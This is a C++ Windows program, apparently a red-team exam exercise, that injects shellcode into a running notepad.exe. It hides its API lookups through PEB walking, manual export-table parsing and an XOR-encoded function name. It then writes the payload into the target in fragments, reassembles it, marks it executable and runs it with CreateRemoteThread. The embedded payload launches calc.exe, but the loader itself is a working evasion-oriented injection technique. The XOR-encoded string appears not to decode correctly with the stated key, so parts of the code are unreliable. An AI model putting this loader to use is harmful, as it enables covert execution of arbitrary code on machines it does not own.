#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>

// --- 結構定義 (用於 PEB 遍歷) ---
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
  ULONG Length;
  BOOLEAN Initialized;
  HANDLE SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
  BOOLEAN InheritedAddressSpace;
  BOOLEAN ReadImageFileExecOptions;
  BOOLEAN BeingDebugged;
  BOOLEAN SpareBool;
  HANDLE Mutant;
  PVOID ImageBaseAddress;
  PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// --- 函數指標類型定義 ---
typedef HANDLE(WINAPI* fn_OpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI* fn_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fn_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* fn_ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* fn_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* fn_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* fn_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* fn_Process32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* fn_Process32Next)(HANDLE, LPPROCESSENTRY32);
typedef FARPROC(WINAPI* fn_GetProcAddress)(HMODULE, LPCSTR);

// XOR 加解密
void xor_crypt(unsigned char* data, size_t len, const char* key) {
  size_t key_len = strlen(key);
  for (size_t i = 0; i < len; i++) {
    data[i] ^= key[i % key_len];
  }
}

// 透過 PEB 獲取 Kernel32 基址 (完全不使用 GetModuleHandle)
HMODULE GetKernel32Base() {
#ifdef _WIN64
  PPEB peb = (PPEB)__readgsqword(0x60);
#else
  PPEB peb = (PPEB)__readfsdword(0x30);
#endif
  PLIST_ENTRY moduleList = &peb->Ldr->InMemoryOrderModuleList;
  PLIST_ENTRY pStartListEntry = moduleList->Flink;

  for (PLIST_ENTRY pListEntry = pStartListEntry; pListEntry != moduleList; pListEntry = pListEntry->Flink) {
    PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - sizeof(LIST_ENTRY));
    if (pEntry->BaseDllName.Buffer != NULL) {
      if (wcsstr(pEntry->BaseDllName.Buffer, L"kernel32.dll") || wcsstr(pEntry->BaseDllName.Buffer, L"KERNEL32.DLL")) {
        return (HMODULE)pEntry->DllBase;
      }
    }
  }
  return NULL;
}

// 手動解析 EAT 獲取函數位址
FARPROC GetSymbolAddress(HMODULE hModule, const char* targetName) {
  PBYTE base = (PBYTE)hModule;
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(base + dosHeader->e_lfanew);
  DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportDirRVA);

  PDWORD names = (PDWORD)(base + exportDir->AddressOfNames);
  PDWORD functions = (PDWORD)(base + exportDir->AddressOfFunctions);
  PWORD ordinals = (PWORD)(base + exportDir->AddressOfNameOrdinals);

  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
    if (strcmp((char*)(base + names[i]), targetName) == 0) {
      return (FARPROC)(base + functions[ordinals[i]]);
    }
  }
  return NULL;
}

// 獲取目標進程 PID
DWORD GetTargetPid(fn_CreateToolhelp32Snapshot fSnapshot, fn_Process32First fFirst, fn_Process32Next fNext, const char* procName) {
  DWORD pid = 0;
  HANDLE hSnap = fSnapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap != INVALID_HANDLE_VALUE) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (fFirst(hSnap, &pe32)) {
      do {
        if (strcmp(pe32.szExeFile, procName) == 0) {
          pid = pe32.th32ProcessID;
          break;
        }
      } while (fNext(hSnap, &pe32));
    }
    CloseHandle(hSnap);
  }
  return pid;
}

int main() {
  const char* key = "rts_exam";
  
  // 1. 獲取基礎環境
  HMODULE hK32 = GetKernel32Base();
  // "GetProcAddress" XORed
  unsigned char s_gpa[] = { 0x35, 0x11, 0x00, 0x01, 0x1d, 0x0c, 0x02, 0x16, 0x22, 0x10, 0x10, 0x15, 0x04, 0x14, 0x12, 0x00 };
  xor_crypt(s_gpa, 15, key);
  fn_GetProcAddress pGPA = (fn_GetProcAddress)GetSymbolAddress(hK32, (char*)s_gpa);

  // 2. 動態解析所有 API
  auto get_api = [&](const char* name) { return pGPA(hK32, name); };
  fn_OpenProcess pOpenProcess = (fn_OpenProcess)get_api("OpenProcess");
  fn_VirtualAllocEx pVAllocEx = (fn_VirtualAllocEx)get_api("VirtualAllocEx");
  fn_WriteProcessMemory pWPM = (fn_WriteProcessMemory)get_api("WriteProcessMemory");
  fn_ReadProcessMemory pRPM = (fn_ReadProcessMemory)get_api("ReadProcessMemory");
  fn_CreateRemoteThread pCRT = (fn_CreateRemoteThread)get_api("CreateRemoteThread");
  fn_VirtualProtectEx pVProtEx = (fn_VirtualProtectEx)get_api("VirtualProtectEx");
  fn_CreateToolhelp32Snapshot pSnap = (fn_CreateToolhelp32Snapshot)get_api("CreateToolhelp32Snapshot");
  fn_Process32First pFirst = (fn_Process32First)get_api("Process32First");
  fn_Process32Next pNext = (fn_Process32Next)get_api("Process32Next");

  // 3. 準備 Payload (範例: calc.exe shellcode)
  unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x41\xff\xd0\x48\x31\xc9\x41\xba\x08\x87\x1d\x60\xff\xd0\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd0\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd0\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
  
  // 4. 尋找 Notepad 並打開
  DWORD pid = GetTargetPid(pSnap, pFirst, pNext, "notepad.exe");
  if (pid == 0) return -1;
  HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

  // 5. 分段寫入 (Fragmentation)
  size_t totalSize = sizeof(shellcode);
  size_t chunkSize = 50; // 每塊 50 bytes
  std::vector<LPVOID> remoteAddresses;

  for (size_t i = 0; i < totalSize; i += chunkSize) {
    size_t currentChunk = (totalSize - i < chunkSize) ? (totalSize - i) : chunkSize;
    // 在目標進程隨機位置申請記憶體
    LPVOID pRemoteChunk = pVAllocEx(hProc, NULL, currentChunk, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteChunk) {
      pWPM(hProc, pRemoteChunk, &shellcode[i], currentChunk, NULL);
      remoteAddresses.push_back(pRemoteChunk);
      printf("[*] Chunk stored at: 0x%p\n", pRemoteChunk);
    }
  }

  // 6. 重組 (Concatenation)
  // 在目標進程申請一塊完整的連續空間
  LPVOID pFinalBuffer = pVAllocEx(hProc, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  size_t offset = 0;
  for (LPVOID addr : remoteAddresses) {
    // 從各個隨機位置讀取並拼接
    unsigned char temp[100];
    size_t sizeToRead = (totalSize - offset < chunkSize) ? (totalSize - offset) : chunkSize;
    pRPM(hProc, addr, temp, sizeToRead, NULL);
    pWPM(hProc, (LPVOID)((uintptr_t)pFinalBuffer + offset), temp, sizeToRead, NULL);
    offset += sizeToRead;
  }

  // 7. 執行
  DWORD oldProt;
  pVProtEx(hProc, pFinalBuffer, totalSize, PAGE_EXECUTE_READ, &oldProt);
  printf("[+] Reassembled at: 0x%p. Executing...\n", pFinalBuffer);
  pCRT(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pFinalBuffer, NULL, 0, NULL);

  CloseHandle(hProc);
  return 0;
}
